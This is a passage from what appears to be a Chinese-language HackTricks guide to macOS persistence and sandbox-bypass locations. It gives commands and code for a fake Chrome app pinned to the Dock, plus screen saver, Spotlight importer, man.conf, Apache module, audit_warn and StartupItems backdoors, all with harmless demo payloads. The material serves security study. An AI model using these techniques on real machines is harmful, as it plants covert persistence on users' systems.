<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### 颜色选择器

写作：[https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* 用于绕过沙盒的有用工具：[🟠](https://emojipedia.org/large-orange-circle)
* 需要发生非常具体的操作
* 你将进入另一个沙盒

#### 位置

* `/Library/ColorPickers`&#x20;
* 需要 root 权限
* 触发条件：使用颜色选择器
* `~/Library/ColorPickers`
* 触发条件：使用颜色选择器

#### 描述和利用

**编译一个颜色选择器**捆绑包，并将你的代码添加到其中（你可以使用[**这个作为例子**](https://github.com/viktorstrate/color-picker-plus)），然后将捆绑包复制到 `~/Library/ColorPickers`。

然后，当触发颜色选择器时，你的代码也会被执行。

请注意，加载你的库的二进制文件有一个**非常严格的沙盒**：`/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Finder Sync插件

**解读**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**解读**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* 用于绕过沙盒的实用性: **否，因为你需要执行自己的应用程序**

#### 位置

* 特定的应用程序

#### 描述和利用

一个包含Finder Sync扩展的应用程序示例[**可以在这里找到**](https://github.com/D00MFist/InSync)。

应用程序可以拥有`Finder Sync扩展`。这个扩展将放在将要执行的应用程序中。此外，为了使扩展能够执行其代码，它**必须使用一些有效的苹果开发者证书进行签名**，它必须**被沙盒化**（尽管可以添加放宽的例外），并且必须注册到类似以下的内容中：
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### 屏幕保护程序

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* 用于绕过沙箱的有用工具：[🟠](https://emojipedia.org/large-orange-circle)
* 但你最终会进入一个常见的应用程序沙箱

#### 位置

* `/System/Library/Screen Savers`&#x20;
* 需要 root 权限
* **触发器**：选择屏幕保护程序
* `/Library/Screen Savers`
* 需要 root 权限
* **触发器**：选择屏幕保护程序
* `~/Library/Screen Savers`
* **触发器**：选择屏幕保护程序

<figure><img src="../.gitbook/assets/image (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### 描述和利用

在 Xcode 中创建一个新项目，并选择模板生成一个新的**屏幕保护程序**。然后，将代码添加到其中，例如以下代码以生成日志。

**构建**它，并将 `.saver` 捆绑包复制到**`~/Library/Screen Savers`**。然后，打开屏幕保护程序 GUI，只需点击它，它就会生成大量日志：

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
请注意，由于在加载此代码的二进制文件（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）的权限中，您可以找到**`com.apple.security.app-sandbox`**，因此您将位于**常见应用程序沙盒**中。
{% endhint %}

屏幕保护程序代码：
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight插件

用于绕过沙盒的有用工具：[🟠](https://emojipedia.org/large-orange-circle)

* 但是你将会进入一个应用程序沙盒

#### 位置

* `~/Library/Spotlight/`
* **触发条件**：创建一个由Spotlight插件管理的具有扩展名的新文件。
* `/Library/Spotlight/`
* **触发条件**：创建一个由Spotlight插件管理的具有扩展名的新文件。
* 需要Root权限
* `/System/Library/Spotlight/`
* **触发条件**：创建一个由Spotlight插件管理的具有扩展名的新文件。
* 需要Root权限
* `Some.app/Contents/Library/Spotlight/`
* **触发条件**：创建一个由Spotlight插件管理的具有扩展名的新文件。
* 需要新的应用程序

#### 描述和利用

Spotlight是macOS内置的搜索功能，旨在为用户提供快速和全面访问计算机上的数据的能力。\
为了实现这种快速搜索功能，Spotlight维护一个专有的数据库，并通过解析大多数文件创建索引，使得可以通过文件名和内容进行快速搜索。

Spotlight的底层机制涉及一个名为'mds'的中央进程，它代表**'元数据服务器'**。该进程协调整个Spotlight服务。此外，还有多个'mdworker'守护进程执行各种维护任务，例如索引不同类型的文件（`ps -ef | grep mdworker`）。这些任务通过Spotlight导入器插件或**".mdimporter bundles"**实现，这些插件使Spotlight能够理解和索引各种文件格式的内容。

这些插件或**`.mdimporter`** bundles位于前面提到的位置，如果出现新的bundle，它会在一分钟内加载（无需重新启动任何服务）。这些bundles需要指示它们可以管理哪些文件类型和扩展名，这样，当创建一个具有指定扩展名的新文件时，Spotlight将使用它们。

可以通过运行以下命令来找到所有加载的`mdimporters`：
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
例如，**/Library/Spotlight/iBooksAuthor.mdimporter** 用于解析这些类型的文件（包括扩展名为 `.iba` 和 `.book` 的文件）：
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
如果您检查其他`mdimporter`的Plist，可能找不到条目**`UTTypeConformsTo`**。这是因为它是一个内置的_统一类型标识符_（[UTI](https://en.wikipedia.org/wiki/Uniform\_Type_Identifier)），不需要指定扩展名。

此外，系统默认插件始终优先，因此攻击者只能访问未被Apple自己的`mdimporters`索引的文件。
{% endhint %}

要创建自己的导入程序，您可以从此项目开始：[https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer)，然后更改名称，**`CFBundleDocumentTypes`**并添加**`UTImportedTypeDeclarations`**以支持您想要支持的扩展名，并在**`schema.xml`**中反映它们。\
然后，**更改**函数**`GetMetadataForFile`**的代码，以在创建具有已处理扩展名的文件时执行您的有效负载。

最后，**构建并复制您的新`.mdimporter`**到三个先前的位置之一，并可以通过**监视日志**或检查**`mdimport -L.`**来检查它何时加载。

### ~~首选项面板~~

{% hint style="danger" %}
看起来这个不再起作用了。
{% endhint %}

Writeup：[https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* 用于绕过沙箱的有用工具：[🟠](https://emojipedia.org/large-orange-circle)
* 它需要特定的用户操作

#### 位置

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### 描述

看起来这个不再起作用了。

## Root沙箱绕过

{% hint style="success" %}
在这里，您可以找到用于**绕过沙箱**的起始位置，允许您通过**将其写入文件**来简单地执行某些操作，而无需**root**和/或其他**奇怪的条件**。
{% endhint %}

### 定期

Writeup：[https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* 用于绕过沙箱的有用工具：[🟠](https://emojipedia.org/large-orange-circle)
* 但您需要是root

#### 位置

* `/etc/periodic/daily`，`/etc/periodic/weekly`，`/etc/periodic/monthly`，`/usr/local/etc/periodic`
* 需要root权限
* **触发器**：时间到达时
* `/etc/daily.local`，`/etc/weekly.local`或`/etc/monthly.local`
* 需要root权限
* **触发器**：时间到达时

#### 描述和利用

定期脚本（**`/etc/periodic`**）是由配置在`/System/Library/LaunchDaemons/com.apple.periodic*`中的**启动守护程序**执行的。请注意，存储在`/etc/periodic/`中的脚本将以**文件的所有者**身份执行，因此对于潜在的特权升级，这将无效。

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

还有其他定期脚本将在 **`/etc/defaults/periodic.conf`** 中执行：
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
如果你成功写入文件`/etc/daily.local`、`/etc/weekly.local`或`/etc/monthly.local`，它们将会**在早晚某个时候被执行**。

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* 用于绕过沙盒的有用技术: [🟠](https://emojipedia.org/large-orange-circle)
* 但你需要是root用户

#### 位置

* 总是需要root权限

#### 描述和利用

由于PAM更加关注在macOS中的持久性和恶意软件，本博客不会详细解释，**请阅读相关的文章以更好地理解这个技术**。

### 授权插件

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* 用于绕过沙盒的有用技术: [🟠](https://emojipedia.org/large-orange-circle)
* 但你需要是root用户并进行额外的配置

#### 位置

* `/Library/Security/SecurityAgentPlugins/`
* 需要root权限
* 还需要配置授权数据库以使用插件

#### 描述和利用

你可以创建一个授权插件，当用户登录时执行该插件以保持持久性。有关如何创建这些插件的更多信息，请查阅之前的文章（请注意，编写不良的插件可能会将你锁在外面，你将需要从恢复模式清理你的Mac）。

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* 用于绕过沙盒的有用技术: [🟠](https://emojipedia.org/large-orange-circle)
* 但你需要是root用户并且用户必须使用man命令

#### 位置

* **`/private/etc/man.conf`**
* 需要root权限
* **`/private/etc/man.conf`**: 每次使用man命令时

#### 描述和利用

配置文件**`/private/etc/man.conf`**指示打开man文档文件时要使用的二进制文件/脚本。因此，可以修改可执行文件的路径，以便每当用户使用man命令阅读文档时，一个后门就会被执行。

例如，在**`/private/etc/man.conf`**中设置：
```
MANPAGER /tmp/view
```
然后创建 `/tmp/view` 文件：
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* 有用于绕过沙盒的功能：[🟠](https://emojipedia.org/large-orange-circle)
* 但你需要是 root 用户并且 Apache 需要在运行中

#### 位置

* **`/etc/apache2/httpd.conf`**
* 需要 root 权限
* 触发条件：当 Apache2 启动时

#### 描述和利用

你可以在 /etc/apache2/httpd.conf 中添加一行来指示加载一个模块，例如：
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

这样，您编译的模块将由Apache加载。唯一的问题是，您需要使用有效的Apple证书进行签名，或者您需要在系统中添加一个新的受信任的证书并使用它进行签名。

然后，如果需要确保服务器启动，您可以执行以下操作：
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb的代码示例：
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM审计框架

写作：[https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* 用于绕过沙盒的有用工具：[🟠](https://emojipedia.org/large-orange-circle)
* 但需要以root身份运行auditd并引发警告

#### 位置

* **`/etc/security/audit_warn`**
* 需要root权限
* **触发条件**：当auditd检测到警告时

#### 描述和利用

每当auditd检测到警告时，脚本**`/etc/security/audit_warn`**会被**执行**。因此，您可以在其中添加您的有效负载。
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
您可以使用`sudo audit -n`强制发出警告。

### 启动项

{% hint style="danger" %}
**此方法已被弃用，因此在以下目录中不应找到任何内容。**
{% endhint %}

**启动项**是一个**目录**，它被放置在以下两个文件夹之一：`/Library/StartupItems/` 或 `/System/Library/StartupItems/`

在将新目录放置在这两个位置之一后，还需要在该目录中放置**另外两个项目**。这两个项目是一个**rc脚本**和一个包含一些设置的**plist**。此plist必须被命名为“**StartupParameters.plist**”。

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% tab title="超级服务名称" %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### emond

{% hint style="danger" %}
我在我的 macOS 中找不到这个组件，所以要获取更多信息，请查看 writeup
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Apple 引入了一个名为 **emond** 的日志记录机制。看起来它从未完全开发，并且可能被 Apple 放弃以开发其他机制，但它仍然可用。

这个鲜为人知的服务对于 Mac 管理员来说可能没有太多用处，但对于威胁行为者来说，一个非常好的理由是将其用作一种持久性机制，大多数 macOS 管理员可能不知道要寻找的地方。检测 emond 的恶意使用不应该很困难，因为该服务的系统 LaunchDaemon 只会在一个地方寻找要运行的脚本：
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### 位置

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* 需要root权限
* **触发条件**：使用XQuartz

#### 描述和利用

XQuartz在macOS中**不再安装**，如果您想获取更多信息，请查看writeup。

### ~~kext~~

{% hint style="danger" %}
即使作为root用户，安装kext也非常复杂，我不会考虑使用它来逃离沙盒或实现持久性（除非您有一个漏洞）
{% endhint %}

#### 位置

要将KEXT安装为启动项，它需要安装在以下位置之一：

* `/System/Library/Extensions`
* 内置于OS X操作系统中的KEXT文件。
* `/Library/Extensions`
* 第三方软件安装的KEXT文件

您可以使用以下命令列出当前加载的kext文件：
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
有关[**内核扩展的更多信息，请查看此部分**](macos-security-and-privilege-escalation/mac-os-architecture#i-o-kit-drivers)。

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### 位置

* **`/usr/local/bin/amstoold`**
* 需要 root 权限

#### 描述和利用

显然，`/System/Library/LaunchAgents/com.apple.amstoold.plist` 中的 `plist` 在使用此二进制文件时暴露了一个 XPC 服务...问题是该二进制文件不存在，因此您可以将某些内容放在那里，当调用 XPC 服务时，您的二进制文件将被调用。

我在我的 macOS 中找不到这个了。

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### 位置

* **`/Library/Preferences/Xsan/.xsanrc`**
* 需要 root 权限
* **触发条件**：当服务运行时（很少发生）

#### 描述和利用

显然，运行此脚本并不常见，我甚至在我的 macOS 中找不到它，所以如果您想获取更多信息，请查看 writeup。

### ~~/etc/rc.common~~

{% hint style="danger" %}
**在现代 MacOS 版本中不起作用**
{% endhint %}

还可以在此处放置**在启动时执行的命令**。例如常规的 rc.common 脚本示例：
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## 持久化技术和工具

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
